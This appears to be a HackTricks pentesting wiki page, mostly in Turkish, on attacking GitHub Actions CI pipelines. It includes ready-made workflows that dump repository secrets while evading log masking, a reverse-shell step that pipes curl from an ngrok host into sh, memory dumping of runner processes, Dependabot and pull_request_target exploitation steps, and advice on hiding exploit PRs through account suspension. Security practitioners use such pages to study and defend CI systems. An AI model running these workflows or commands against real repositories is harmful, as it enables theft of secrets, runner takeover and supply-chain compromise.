# Github Actions'ın Kötüye Kullanımı

{{#include ../../../banners/hacktricks-training.md}}

## Araçlar

Aşağıdaki araçlar Github Action iş akışlarını bulmak ve hatta kırılgan olanları tespit etmek için faydalıdır:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Ayrıca kontrol listesine bakın: [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Temel Bilgiler

Bu sayfada şunları bulacaksınız:

- Bir **saldırganın bir Github Action'a erişim sağlaması halinde tüm etkilerin özeti**
- Bir action'a **erişim elde etmenin** farklı yolları:
- Action oluşturma **izinlerine** sahip olmak
- **pull request** ile ilgili tetikleyicilerin kötüye kullanılması
- Diğer **external access** tekniklerinin kötüye kullanılması
- Zaten ele geçirilmiş bir repo'dan **Pivoting**
- Son olarak, bahsedilen etkileri gerçekleştirmek için bir action'ın içeriden kötüye kullanılmasıyla ilgili **post-exploitation teknikleri**

## Etkiler Özeti

Bir giriş için [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

Eğer bir repository içinde **GitHub Actions'ta rastgele kod çalıştırabiliyorsanız**, şunları yapabilirsiniz:

- Pipeline'a monte edilmiş **secrets**'ları çalmak ve pipeline'ın ayrıcalıklarını suistimal ederek AWS ve GCP gibi harici platformlara yetkisiz erişim elde etmek.
- Dağıtımları (deployments) ve diğer artifact'leri ele geçirmek.
- Eğer pipeline varlıkları deploy ediyor veya depoluyorsa, nihai ürünü değiştirebilir ve böylece bir supply chain attack'e olanak sağlayabilirsiniz.
- Custom workers içinde kod çalıştırarak hesaplama gücünü suistimal etmek ve diğer sistemlere pivot yapmak.
- `GITHUB_TOKEN` ile ilişkili izinlere bağlı olarak repository kodunu üzerine yazmak.

## GITHUB_TOKEN

Bu "**secret**" ( `${{ secrets.GITHUB_TOKEN }}` ve `${{ github.token }}`'den gelir) admin bu seçeneği etkinleştirdiğinde verilir:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Bu token, bir **Github Application** tarafından kullanılanla aynıdır; bu yüzden aynı endpoint'lere erişebilir: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.

Bu token'ın olası **izinlerini** şurada görebilirsiniz: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Not: Token'ın **job tamamlandıktan sonra süresinin dolacağını** unutmayın.\
Bu tür token'lar şu şekilde görünür: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Bu token ile yapabileceğiniz bazı ilginç şeyler:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Bazı durumlarda **github user tokens inside Github Actions envs or in the secrets** bulabileceğinizi unutmayın. Bu tokens repository ve organization üzerinde size daha fazla yetki verebilir.

<details>

<summary>Github Action çıktısında secrets'leri listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Secrets kullanarak reverse shell al</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Diğer kullanıcıların repository'lerinde bir Github Token'a verilen izinleri **actions'ın loglarını kontrol ederek** öğrenmek mümkün:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## İzinli Çalıştırma

> [!NOTE]
> Bu, Github actions'ı ele geçirmenin en kolay yolu olur; çünkü bu durumda organizasyonda **create a new repo in the organization**, veya bir repository üzerinde **write privileges over a repository** erişiminiz olması gerekir.
>
> Bu senaryodaysanız sadece [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action) bölümünü kontrol edebilirsiniz.

### Repo Oluşturularak Çalıştırma

Eğer bir organizasyonun üyeleri **create new repos** oluşturabiliyorsa ve siz github actions çalıştırabiliyorsanız, **create a new repo and steal the secrets set at organization level**.

### Yeni Bir Branch'ten Çalıştırma

Eğer zaten bir Github Action içeren bir repository'de **create a new branch in a repository that already contains a Github Action** oluşturabiliyorsanız, bu action'ı **modify**, içeriği **upload** edip ardından **execute that action from the new branch**. Bu şekilde **exfiltrate repository and organization level secrets** yapabilirsiniz (ama bunların nasıl isimlendirildiğini bilmeniz gerekir).

> [!WARNING]
> workflow YAML içinde (örneğin, `on: push: branches: [main]`, job conditionals veya manual gates) sadece dosya içi kısıtlamalar uygulanmışsa bunlar collaborator'lar tarafından düzenlenebilir. Harici bir zorlayıcı (branch protections, protected environments, and protected tags) yoksa bir katkıda bulunan kişi workflow'u kendi branch'ında çalışacak şekilde yeniden hedefleyebilir ve mounted secrets/permissions'i kötüye kullanabilir.

Değiştirilmiş action'ı **manually** çalıştırılabilir hale getirebilir, bir **PR is created** olduğunda veya **some code is pushed** olduğunda tetikleyebilirsiniz (ne kadar gürültü yapmak istediğinize bağlı olarak):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Forked Execution

> [!NOTE]
> Saldırganın başka bir repository'nin **Github Action**'ını **çalıştırmasına** izin verebilecek farklı tetikleyiciler vardır. Eğer bu tetiklenebilir actions'lar kötü yapılandırılmışsa, bir saldırgan onları ele geçirebilir.

### `pull_request`

Workflow tetikleyicisi **`pull_request`**, bir pull request alındığında workflow'u her seferinde çalıştırır; bazı istisnalar vardır: varsayılan olarak eğer repo ile **ilk kez** katkıda bulunuyorsanız, bazı **maintainer**'ların workflow çalıştırılmasını **onaylaması** gerekir:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Varsayılan kısıtlama **ilk kez** katkıda bulunanlar içindir; geçerli bir bug/typo'yu düzelterek katkıda bulunup sonra yeni `pull_request` ayrıcalıklarınızı kötüye kullanmak için **başka PR'ler** gönderebilirsiniz.
>
> **Bunu test ettim ve işe yaramıyor**: ~~Another option would be to create an account with the name of someone that contributed to the project and deleted his account.~~

Ayrıca, varsayılan olarak hedef repository'ye **yazma izinlerini** ve **secret'lara erişimi** engeller, detaylar için [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Bir saldırgan, rastgele şeyler çalıştırmak ve rastgele actions eklemek için Github Action tanımını değiştirebilir. Ancak, bahsedilen kısıtlamalar nedeniyle secret'ları çalamaz veya repoyu overwrite edemez.

> [!CAUTION]
> **Yes, if the attacker change in the PR the github action that will be triggered, his Github Action will be the one used and not the one from the origin repo!**

Saldırgan çalıştırılan koda da hakim olduğu için, `GITHUB_TOKEN` üzerinde secret veya yazma izinleri olmasa bile örneğin **kötücül artefaktlar yükleyebilir**.

### **`pull_request_target`**

Workflow tetikleyicisi **`pull_request_target`** hedef repository'ye **yazma iznine** ve **secret'lara erişime** sahiptir (ve izin istemez).

Dikkat: workflow tetikleyicisi **`pull_request_target`** **base context'te çalışır** ve PR tarafından verilen context'te çalışmaz (güvenilmeyen kodu çalıştırmamak için). `pull_request_target` hakkında daha fazla bilgi için [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Ayrıca, bu özel tehlikeli kullanım hakkında daha fazla bilgi için şu [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) kontrol edin.

Base'de tanımlı olan ve PR'dekinde olmayan **icra edilen workflow** nedeniyle **`pull_request_target`** kullanmak güvenli görünebilir, fakat güvenli olmadığı birkaç durum vardır.

Ve bunun **secret'lara erişimi** olacaktır.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger allows to run a workflow from a different one when it's `completed`, `requested` or `in_progress`.

In this example, a workflow is configured to run after the separate "Run Tests" workflow completes:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Ayrıca dokümanlara göre: `workflow_run` olayıyla başlatılan workflow, önceki workflow başlatılmamış olsa bile **`secrets`'e erişebilir ve write token'lar yazabilir**.

Bu tür bir workflow, bir dış kullanıcının **`pull_request`** veya **`pull_request_target`** aracılığıyla tetikleyebildiği bir **workflow**'a **bağımlıysa** saldırıya uğrayabilir. Birkaç zayıf örnek [**bu blogda bulunabilir**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability). İlki, `workflow_run` ile tetiklenen workflow'un saldırganın kodunu indirmesi üzerine kuruludur: `${{ github.event.pull_request.head.sha }}`  
İkincisi, **untrusted** koddan bir **artifact**'i `workflow_run` workflow'una **geçirmek** ve bu artifact içeriğini RCE'ye açık hale getirecek şekilde kullanmaktır.

### `workflow_call`

TODO

TODO: pull_request'ten çalıştırıldığında kullanılan/indirilen kodun origin'den mi yoksa forked PR'den mi olduğunu kontrol et

## Fork edilmiş çalıştırmanın kötüye kullanımı

Bir dış saldırganın bir GitHub workflow'unu çalıştırmasını sağlayabileceği tüm yolları zaten belirttik; şimdi bu çalıştırmalar kötü yapılandırılmışsa nasıl kötüye kullanılabileceğine bakalım:

### Güvenilmeyen checkout çalıştırması

`pull_request` durumunda, workflow **PR bağlamında** çalıştırılacaktır (yani **kötücül PR'ın kodunu** çalıştırır), fakat önce birinin **bunu yetkilendirmesi** gerekir ve bazı [sınırlamalar](#pull_request) ile çalışır.

`pull_request_target` veya `workflow_run` kullanan ve `pull_request_target` veya `pull_request` ile tetiklenebilen bir workflow'a bağımlı olan bir workflow durumunda, orijinal repo'daki kod çalıştırılır; bu yüzden **saldırgan çalıştırılan kodu kontrol edemez**.

> [!CAUTION]
> Ancak, eğer **action**'ın açık bir PR checkout'u varsa ve kodu **PR'den alıyorsa** (base'den değil), saldırganın kontrol ettiği kodu kullanır. Örneğin (satır 12'de PR kodunun indirildiğine bakın):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Olası **güvenilmeyen kod `npm install` veya `npm build` sırasında çalıştırılır**, çünkü build script'leri ve referans verilen **package'ler PR yazarı tarafından kontrol edilir**.

> [!WARNING]
> Zayıf action'ları aramak için bir GitHub dork'u: `event.pull_request pull_request_target extension:yml` ancak, action güvensiz yapılandırılmış olsa bile job'ların güvenli şekilde çalıştırılmasını sağlamak için farklı yollar vardır (ör. PR'i oluşturan aktörün kim olduğuna dair koşullar kullanmak).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

PR'ı oluşturan **kullanıcı** tarafından kontrol edilen değerleri olan belirli [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) olduğunu unutmayın. Eğer github action bu **veriyi herhangi bir şey çalıştırmak için kullanıyorsa**, bu **keyfi kod yürütmeye** yol açabilir:

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Dokümanlara göre: Bir workflow job'unda bir ortam değişkenini tanımlayarak veya güncelleyerek ve bunu **`GITHUB_ENV`** environment dosyasına yazarak sonraki adımlarda kullanılabilir hale getirebilirsiniz.

Eğer bir saldırgan bu **env** değişkeninin içine **herhangi bir değer enjekte edebilirse**, sonraki adımlarda kod çalıştırabilecek **LD_PRELOAD** veya **NODE_OPTIONS** gibi env değişkenlerini enjekte edebilir.

Örneğin ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ve [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), içeriğini `GITHUB_ENV` env değişkenine kaydetmek için yüklenen bir artifact'e güvenen bir workflow olduğunu düşünün. Bir saldırgan bunu ele geçirmek için şöyle bir şey yükleyebilir:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot ve diğer güvenilir botlar

Bu [**blog yazısında**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest) belirtildiği gibi, bazı organizasyonlar `dependabot[bot]`'tan gelen herhangi bir PR'ı otomatik olarak merge eden bir GitHub Action'a sahip, örneğin:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Bu bir sorun çünkü `github.actor` alanı workflow'u tetikleyen son olaya neden olan kullanıcıyı içerir. Ve `dependabot[bot]` kullanıcısının bir PR'ı değiştirmesini sağlamak için birkaç yol vardır. Örneğin:

- Hedef repository'yi fork et
- Kopyana malicious payload ekle
- Fork'unda outdated dependency ekleyerek Dependabot'u etkinleştir. Dependabot, dependency'yi düzeltmek için malicious code içeren bir branch oluşturacak.
- O branch'ten hedef repository'ye bir Pull Request aç (PR kullanıcı tarafından oluşturulacak, bu yüzden şimdilik hiçbir şey olmayacak)
- Sonra, saldırgan fork'unda Dependabot'un açtığı ilk PR'ye geri döner ve `@dependabot recreate` çalıştırır
- Ardından, Dependabot o branch'te bazı işlemler yapar ve bu, hedef repo üzerindeki PR'ı değiştirir; bu da `dependabot[bot]`'u workflow'u tetikleyen son olayın actor'ü yapar (dolayısıyla workflow çalışır).

Devam edersek, merge etmek yerine Github Action'ın şu örnekteki gibi bir command injection'a sahip olduğunu varsayarsak:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Well, the original blogpost proposes two options to abuse this behavior being the second one:

- Fork the victim repository and enable Dependabot with some outdated dependency.
- Create a new branch with the malicious shell injection code.
- Change the default branch of the repo to that one
- Create a PR from this branch to the victim repository.
- Run `@dependabot merge` in the PR Dependabot opened in his fork.
- Dependabot will merge his changes in the default branch of your forked repository, updating the PR in the victim repository making now the `dependabot[bot]` the actor of the latest event that triggered the workflow and using a malicious branch name.

### Zafiyetli Üçüncü Taraf Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Bu, [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks)'ta belirtildiği gibi, farklı workflows'lardan ve hatta repository'lerden artifact'lara erişim sağlıyor.

Asıl sorun şu ki, eğer **`path`** parametresi ayarlanmamışsa, artifact mevcut dizine çıkarılır ve bu, daha sonra workflow içinde kullanılabilecek veya hatta çalıştırılabilecek dosyaların üzerine yazabilir. Bu nedenle, Artifact zafiyetliyse, bir saldırgan bunu kötüye kullanarak Artifact'a güvenen diğer workflow'ları tehlikeye atabilir.

Zafiyetli workflow örneği:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Bu, şu workflow ile saldırılabilir:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Diğer Harici Erişim

### Deleted Namespace Repo Hijacking

If an account changes it's name another user could register an account with that name after some time. If a repository had **less than 100 stars previously to the change of nam**e, Github will allow the new register user with the same name to create a **repository with the same name** as the one deleted.

> [!CAUTION]
> Bu yüzden eğer bir action, mevcut olmayan bir account'tan bir repo kullanıyorsa, bir saldırgan o account'u oluşturup action'ı ele geçirebilir.

If other repositories where using **dependencies from this user repos**, an attacker will be able to hijack them Here you have a more complete explanation: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> Bu bölümde, ilk repo üzerinde bir erişimimiz olduğunu varsayarak **pivot from one repo to another** sağlayan tekniklerden bahsedeceğiz (önceki bölüme bakın).

### Cache Poisoning

A cache is maintained between **wokflow runs in the same branch**. Which means that if an attacker **compromise** a **package** that is then stored in the cache and **downloaded** and executed by a **more privileged** workflow he will be able to **compromise** also that workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows could use **artifacts from other workflows and even repos**, if an attacker manages to **compromise** the Github Action that **uploads an artifact** that is later used by another workflow he could **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

As commented in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), even if a repository or organization has a policy restricting the use of certain actions, an attacker could just download (`git clone`) and action inside the workflow and then reference it as a local action. As the policies doesn't affect local paths, **the action will be executed without any restriction.**

Örnek:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### OIDC ile AWS ve GCP'ye erişim

Aşağıdaki sayfalara bakın:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Secrets'e erişim <a href="#accessing-secrets" id="accessing-secrets"></a>

Bir script'e içerik enjekte ediyorsanız, secrets'e nasıl erişebileceğinizi bilmek faydalı olabilir:

- Eğer secret veya token bir **environment variable** olarak ayarlanmışsa, **`printenv`** kullanılarak ortam üzerinden doğrudan erişilebilir.

<details>

<summary>Github Action çıktısında secrets'leri listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Secrets ile reverse shell al</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- If the secret is used **directly in an expression**, the generated shell script is stored **on-disk** and is accessible.
- ```bash
cat /home/runner/work/_temp/*
```
- For a JavaScript actions the secrets and sent through environment variables
- ```bash
ps axe | grep node
```
- For a **custom action**, the risk can vary depending on how a program is using the secret it obtained from the **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Enumerate all secrets via the secrets context (collaborator level). A contributor with write access can modify a workflow on any branch to dump all repository/org/environment secrets. Use double base64 to evade GitHub’s log masking and decode locally:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decode locally:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: for stealth during testing, encrypt before printing (openssl is preinstalled on GitHub-hosted runners).

### Self-hosted runners'ın kötüye kullanılması

Hangi **Github Actions'ın non-github altyapısında yürütüldüğünü** bulmanın yolu, Github Action yapılandırma yaml'ında **`runs-on: self-hosted`** aramaktır.

**Self-hosted** runner'lar ekstra hassas bilgilere, diğer **network systems**'e (ağdaki zafiyetli endpoints? metadata service?) erişim sağlayabilir veya izole edilip yok edilseler bile, **aynı anda birden fazla action çalıştırılabilir** ve kötü amaçlı olan action diğerinin **secrets**'larını çalabilir.

Self-hosted runner'larda ayrıca belleğini dump ederek workflow'ların herhangi bir adımındaki tüm secrets'ları içerecek olan **secrets from the \_Runner.Listener**\_\*\* process\*\*'i elde etmek de mümkündür:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Daha fazla bilgi için [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Github actions ile bir Docker image'ı Github içinde **build edip depolamak** mümkündür.\
Bir örnek aşağıdaki genişleyebilir kısımda bulunabilir:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Önceki kodda görebileceğiniz gibi, Github registry **`ghcr.io`** üzerinde barındırılıyor.

Repoyu okuma iznine sahip bir kullanıcı, ardından kişisel erişim belirteci kullanarak Docker Image'ı indirebilir:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, kullanıcı **leaked secrets in the Docker image layers:** için arama yapabilir:

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Github Actions loglarında hassas bilgiler

Even if **Github** try to **detect secret values** in the actions logs and **avoid showing** them, **other sensitive data** that could have been generated in the execution of the action won't be hidden. For example a JWT signed with a secret value won't be hidden unless it's [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## İzlerini Örtme

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Öncelikle, açılan herhangi bir PR hem Github üzerinde hem de hedef GitHub account için halka açıktır. GitHub'da varsayılan olarak, **we can’t delete a PR of the internet**, ama bir tuhaflık vardır. Github tarafından **suspended** edilen hesapların tüm **PR'leri otomatik olarak silinir** ve internetten kaldırılır. Bu nedenle aktivitenizi gizlemek için ya **GitHub account suspended** olmasını sağlamanız ya da hesabınızın **flagged** edilmesi gerekir. Bu, GitHub üzerindeki tüm aktivitelerinizi internetten **gizleyecektir** (temelde exploit PR'lerinizi kaldırır).

Bir organization GitHub üzerinde hesapları GitHub'a bildirme konusunda çok proaktiftir. Yapmanız gereken tek şey Issue içinde “some stuff” paylaşmak ve onlar hesabınızın 12 saat içinde suspended olmasını sağlayacaklardır :p böylece exploit'iniz github üzerinde görünmez hale gelir.

> [!WARNING]
> The only way for an organization to figure out they have been targeted is to check GitHub logs from SIEM since from GitHub UI the PR would be removed.

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
